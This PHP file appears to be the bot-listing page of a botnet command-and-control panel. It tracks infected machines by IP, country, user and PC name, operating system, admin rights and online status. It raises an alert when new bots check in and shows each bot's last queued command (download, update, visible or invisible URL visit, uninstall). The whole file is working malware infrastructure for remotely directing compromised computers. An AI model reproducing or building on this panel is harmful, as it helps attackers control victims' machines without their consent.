<?php 
    session_start();
    
	require_once('inc/session.php');
	require_once('inc/config.php');
	include('inc/functions.php');
	include("ip_files/countries.php");
	
	$query_1 = mysql_query("SELECT COUNT(*) FROM clients ");
	$item_count = mysql_result($query_1, 0);
	$query_1 = mysql_query("SELECT * FROM clients ORDER BY id DESC");
	
	$newbots = mysql_num_rows(mysql_query("SELECT * FROM clients"));
	
	 if($_SESSION['currentbots'] < $newbots)
	 {
	
	echo '
	<script type="text/javascript">

	alwaysOnTop.init({
	targetid: \'examplediv\',
	orientation: 3,
	position: [5, 10],
	fadeduration: [1000, 1000],
	frequency: 0.95,
	hideafter: 3000
	})

	alwaysOnTop.init({
	targetid: \'ajaxdiv\',
	orientation: 1,
	position: [0, 0],
	hideafter: 3000,
	externalsource: \'alert.php\'
	})

	</script>';
	}
	$_SESSION['currentbots'] = $newbots;
	echo '<table>
		  <tr>
			<th style="width: 50px; text-align: center;" class="th">ID</th>
			<th class="th" style="text-align: center;">Country</th>
			<th class="th" style="text-align: center;">IP</th>
			<th class="th" style="text-align: center;">User@PC</th>
			<th class="th" style="text-align: center; width: 200px;">Operating System</th>
			<th class="th" style="text-align: center;">Last Checked</th>
			<th class="th" style="text-align: center; width: 60px;">Admin</th>
			<th class="th" style="text-align: center; width: 60px;">Status</th>
			<th class="th" style="text-align: center; width: 25px;">Info</th>
		  </tr>';
			while($row = mysql_fetch_array($query_1))
			 {
			 $IPaddress=$row['ip'];
			 $two_letter_country_code=iptocountry($IPaddress);
			 $country_name=$countries[$two_letter_country_code][1];

			 // To display flag
			 $cctolower = strtolower($two_letter_country_code);
			 $flagname = "flags/".$cctolower.".gif";
			 $file_to_check = $flagname;
			 
			 $readable_date=date("j F Y, G:i", $row['time']);
			
				echo '<tr>
						  <td style="width: 50px; text-align: center;" class="td">#'.$row['id'].'</td>
						  <td class="td" style="text-align: center;">';
						  if (file_exists($file_to_check)){
               			 		  print "<img src=$file_to_check> $country_name<br>";
               			 		  }else{
                				  print "<img src=flags/noflag.gif> $country_name<br>";
               					  }		
               					  echo '</td>
						  <td class="td" style="text-align: center;">'.$row['ip'].'</td>
						  <td class="td" style="text-align: center;">'.$row['userandpc'].'</td>
						  <td class="td" style="text-align: center; width: 200px;">'.$row['os'].'</td>
						  <td class="td" style="text-align: center;">'.$readable_date.'</td>
						  <td class="td" style="text-align: center; width: 60px;">'.$row['admin'].'</td>';
						  if($row['status'] == 'Online'){
						  echo '<td class="td" style="text-align: center; color: green; width: 60px;">'.$row['status'].'</td>';
						  }
						  if($row['status'] == 'Offline'){
						  echo '<td class="td" style="text-align: center; color: red; width: 60px;">'.$row['status'].'</td>';
						  }
						  if($row['status'] == 'Dead'){
						  echo '<td class="td" style="text-align: center; width: 60px;">'.$row['status'].'</td>';
						  }						 
						  echo '<td class="td" style="text-align: center; width: 25px;"><img src=img/info.png title="Latest Command Sent: ';
						  $botid = $row['id'];
						  $result = mysql_fetch_array(mysql_query("SELECT * FROM commands WHERE botid LIKE '$botid'"));
						  
						  $i = 0;
						  if($result['cmd'] == 'DL'){
						  echo 'Download|'.$result['variable'];
						  $i = 1;
						  }
						  
						  if($result['cmd'] == 'UP'){
						  echo 'Update|'.$result['variable'];
						  $i = 1;
						  }
						  
						  if($result['cmd'] == 'VV'){
						  echo 'Visit Visible|'.$result['variable'];
						  $i = 1;
						  }
						  
						  if($result['cmd'] == 'VI'){
						  echo 'Visit Invisible|'.$result['variable'];
						  $i = 1;
						  }
						  
						  if($result['cmd'] == 'UN'){
						  echo 'Uninstall';
						  $i = 1;
						  }

						  if($i == 0){
						  echo 'N/A';
						  }
						  
						  echo '"></td></tr>';
			 }
			 echo '</table>';
?>